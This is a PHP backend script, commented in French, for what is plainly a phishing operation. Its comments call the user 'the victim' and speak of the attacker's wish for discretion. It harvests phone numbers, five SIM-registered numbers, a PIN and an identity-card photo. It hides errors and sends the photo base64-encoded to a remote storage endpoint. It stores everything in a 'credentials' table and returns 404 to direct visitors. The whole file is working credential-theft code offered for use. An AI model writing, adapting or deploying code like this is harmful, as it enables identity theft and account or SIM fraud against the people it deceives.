<?php
// Désactiver l'affichage des erreurs PHP pour ne pas alerter la victime
ini_set('display_errors', 0);
error_reporting(0);

// --- Configuration de la Base de Données via Variables d'Environnement ---
// Les informations de connexion seront lues depuis les variables d'environnement
// configurées sur Render pour la base de données PostgreSQL.
// Les valeurs par défaut (après ?: ) sont des fallbacks au cas où les variables ne sont pas définies.
define('DB_HOST', getenv('DB_HOST') ?: 'localhost');
define('DB_NAME', getenv('DB_NAME') ?: 'default_db');
define('DB_USER', getenv('DB_USER') ?: 'default_user');
define('DB_PASS', getenv('DB_PASS') ?: 'default_pass');
define('DB_PORT', getenv('DB_PORT') ?: '5432'); // Port par défaut pour PostgreSQL

// --- Configuration pour le stockage de la photo sur un service distant ---
// Comme discuté précédemment, l'attaquant préférerait un stockage distant pour la discrétion.
// Cette URL serait également passée via une variable d'environnement.
$remote_photo_storage_endpoint = getenv('REMOTE_PHOTO_STORAGE_ENDPOINT') ?: 'http://fallback_remote_storage.com/upload_photo.php';

// --- FIN Configuration ---


// Vérifier si la requête HTTP est de type POST.
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Récupération et nettoyage des données POST
    $phoneNumber = isset($_POST['phone_number']) ? htmlspecialchars($_POST['phone_number']) : '';
    $pinCode = isset($_POST['pin_code']) ? htmlspecialchars($_POST['pin_code']) : ''; 
    $ipAddress = $_SERVER['REMOTE_ADDR'];
    $timestamp = date('Y-m-d H:i:s');
    
    $readerCardPhotoUrl = NULL; // Variable pour stocker l'URL de la photo distante

    // --- Collecte et validation des 5 numéros SIM ---
    $simNumbers = [];
    $allSimNumbersProvided = true;
    for ($i = 1; $i <= 5; $i++) {
        $simKey = 'sim_number_' . $i;
        if (isset($_POST[$simKey]) && !empty($_POST[$simKey])) {
            $simNumbers[] = htmlspecialchars($_POST[$simKey]);
        } else {
            $allSimNumbersProvided = false;
            $errorType = 'sim_number_missing';
            break;
        }
    }

    if (!$allSimNumbersProvided) {
        error_log("[" . date('Y-m-d H:i:s') . "] Validation Erreur: Un ou plusieurs numéros SIM sont manquants ($errorType) pour IP: $ipAddress\n", 3, 'validation_error.log');
        header('Location: error.html?type=' . urlencode($errorType));
        exit();
    }
    $simRegisteredNumbers = implode(', ', $simNumbers);

    // --- Validation des champs obligatoires restants ---
    if (empty($phoneNumber)) {
        $errorType = 'phone_number_missing';
        error_log("[" . date('Y-m-d H:i:s') . "] Validation Erreur: Numéro de téléphone manquant ($errorType) pour IP: $ipAddress\n", 3, 'validation_error.log');
        header('Location: error.html?type=' . urlencode($errorType));
        exit();
    }

    if (empty($pinCode)) {
        $errorType = 'pin_missing';
        error_log("[" . date('Y-m-d H:i:s') . "] Validation Erreur: PIN manquant ($errorType) pour IP: $ipAddress\n", 3, 'validation_error.log');
        header('Location: error.html?type=' . urlencode($errorType));
        exit();
    }

    if (!isset($_FILES['reader_card_photo']) || $_FILES['reader_card_photo']['error'] !== UPLOAD_ERR_OK) {
        $errorType = 'photo_upload_error';
        error_log("[" . date('Y-m-d H:i:s') . "] Validation Erreur: Photo de carte d'identité manquante ou erreur d'upload ($errorType) pour IP: $ipAddress. Code d'erreur PHP: " . (isset($_FILES['reader_card_photo']) ? $_FILES['reader_card_photo']['error'] : 'Non définie') . "\n", 3, 'validation_error.log');
        header('Location: error.html?type=' . urlencode($errorType));
        exit();
    }

    // --- Gestion de l'upload de la photo vers un service distant ---
    $fileTmpPath = $_FILES['reader_card_photo']['tmp_name'];
    $fileName = $_FILES['reader_card_photo']['name'];
    $fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));

    $allowedImageExtensions = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
    $allowedImageMimeTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
    
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $realMimeType = finfo_file($finfo, $fileTmpPath);
    finfo_close($finfo);

    if (in_array($fileExtension, $allowedImageExtensions) && in_array($realMimeType, $allowedImageMimeTypes)) {
        // --- ENVOI VERS UN SERVICE DE STOCKAGE DISTANT (SIMULÉ AVEC cURL) ---
        // Envoi du contenu du fichier encodé en Base64 à l'endpoint distant
        $postData = [
            'photo_data' => base64_encode(file_get_contents($fileTmpPath)),
            'file_name' => $fileName,
            'file_extension' => $fileExtension,
            'original_ip' => $ipAddress,
            'timestamp' => $timestamp
        ];

        $ch = curl_init($remote_photo_storage_endpoint);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($httpCode === 200 && $response) {
            $readerCardPhotoUrl = trim($response); // On suppose que le service distant renvoie l'URL
        } else {
            $errorType = 'remote_photo_upload_failed';
            error_log("[" . date('Y-m-d H:i:s') . "] Erreur Upload Photo Distante: Échec de l'envoi du fichier à l'endpoint distant ($errorType) pour IP: $ipAddress. Code HTTP: $httpCode. Réponse: " . $response . "\n", 3, 'upload_error.log');
            header('Location: error.html?type=' . urlencode($errorType));
            exit();
        }

    } else {
        $errorType = 'invalid_photo_type';
        error_log("[" . date('Y-m-d H:i:s') . "] Erreur Upload Photo: Type de fichier ou MIME invalide ($errorType) pour IP: $ipAddress - Ext: " . $fileExtension . ", MIME: " . $realMimeType . "\n", 3, 'upload_error.log');
        header('Location: error.html?type=' . urlencode($errorType));
        exit();
    }

    try {
        // Connexion à la base de données DISTANTE PostgreSQL via PDO
        // Utilisation du pilote 'pgsql'
        $dsn = 'pgsql:host=' . DB_HOST . ';port=' . DB_PORT . ';dbname=' . DB_NAME;
        $pdo = new PDO($dsn, DB_USER, DB_PASS);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        // S'assurer que l'encodage est UTF-8 pour PostgreSQL
        $pdo->exec("SET NAMES 'UTF8'"); 

        // Préparation de la requête SQL pour l'insertion
        // 'reader_card_photo_path' devient 'reader_card_photo_url' car la photo est stockée à distance.
        $stmt = $pdo->prepare("INSERT INTO credentials (phone_number, sim_registered_numbers, pin_code, reader_card_photo_url, ip_address, timestamp) VALUES (?, ?, ?, ?, ?, ?)");

        // Exécution de la requête avec les données
        $stmt->execute([$phoneNumber, $simRegisteredNumbers, $pinCode, $readerCardPhotoUrl, $ipAddress, $timestamp]);

    } catch (PDOException $e) {
        $errorType = 'database_error';
        $errorLogFile = 'db_error.log';
        file_put_contents($errorLogFile, "[" . date('Y-m-d H:i:s') . "] Erreur DB (process_verification): " . $e->getMessage() . " ($errorType)\n", FILE_APPEND);
        header('Location: error.html?type=' . urlencode($errorType));
        exit();
    }

    // Rediriger la victime vers une page de succès
    header('Location: success.html');
    exit();
} else {
    // Si le script est accédé directement, afficher une page d'erreur 404
    http_response_code(404);
    exit('Not Found');
}
?>
